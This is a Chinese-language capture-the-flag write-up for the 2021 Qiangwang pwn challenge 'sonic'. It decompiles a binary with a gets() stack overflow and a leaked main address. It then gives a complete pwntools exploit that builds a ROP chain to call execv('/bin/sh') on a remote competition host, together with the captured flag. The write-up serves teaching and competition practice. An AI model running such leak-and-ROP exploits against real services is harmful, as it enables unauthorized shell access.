# 第四届“强网”拟态防御国际精英挑战赛 2021 pwn **sonic**

> challenge name: `sonic`
>
> file: `sonic`
>
> .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/hex-16

程序可以泄露程序基址，存在栈溢出漏洞，利用程序的gadgets做ROP。程序有execv系统调用，可以通过执行以下指令getshell

```cpp
execv("/bin/sh\x00", NULL); // rdi, rsi
```



# IDA Analysis

- main: 会输出main的地址，可以通过这个得到程序基址

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *argva[4]; // [rsp+10h] [rbp-20h] BYREF

  printf("main Address=%p\n", main);
  makeUserName();
  printf("userName =%s\n", userName);
  argva[0] = loginpath;                         // 字符串数组第一个参数是 文件路径
  argva[1] = userName;                          // 命令参数
  argva[2] = 0LL;                               // execv执行要求这个得是NULL
  execv(loginpath, argva);
  return 0;
}
```

- makeUserName

```cpp
char *makeUserName()
{
  char src[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("login:");
  gets((__int64)src);                           // 溢出点 无输入长度限制
  return strcpy(userName, src);
}
```

makeUserName里面调gets赋值，没有输入长度限制，存在栈溢出漏洞。

main中给出了execv的调用，ROP时可以返回到这里

程序中存在`"/bin/sh"`字符串



# exp

```python
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
IP = "123.60.63.90"
PORT = 6890
DEBUG = 0


if DEBUG:
    p = process("./sonic")
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[0].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())

else:
    p = remote(IP, PORT)


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        cmd += "b *%d\n" % (base + 0x7B4)
        cmd += "b *%d\n" % (base + 0x7C7)  #
        cmd += "set $a=%d\n" % (base + 0x201040)  #
        cmd += "set $b=%d\n" % (base + 0x201010)  # loginpath
        debug(cmd)


ru("main Address=")
main_addr = int(ru("\n")[:-1], 16)
base_addr = main_addr - 0x7CF
print("main_addr=", type(main_addr), hex(main_addr), hex(base_addr))

# 找gadgets 构造ROP chain
pop_rdi = p64(base_addr + 0x8c3)  # 0x00000000000008c3 : pop rdi ; ret
pop_rsi_pop_r15 = p64(base_addr + 0x8c1)  # 0x00000000000008c1 : pop rsi ; pop r15 ; ret
execv_addr = p64(base_addr + 0x847) # call execv的地址
rbp = p64(0)  # p64(base_addr + 0x201010)
bash_addr = p64(base_addr + 0x201040) # "/bin/sh\x00"的地址
# payload: 令rdi指向"/bin/sh\x00" rsi r15赋值为0，返回地址为execv的地址
payload = b"/bin/sh\x00".ljust(32, b'a') + rbp + pop_rdi + bash_addr + pop_rsi_pop_r15 + p64(0) + p64(0) + execv_addr
# rdi=bash_addr; rsi=0 r15=0, execv("/bin/sh\x00", 0)
dd()
sl(payload)
p.interactive()  # flag{riCGJnvUieCXasPUUiAQ6XzWVdjFJTQB}

```



- 用于验证execv用法的代码：

```cpp
#include <unistd.h>
#include <cstdlib>

int main() {
    char* argv[3];
    argv[0] = NULL;
    execv("/bin/sh", argv);
}
```

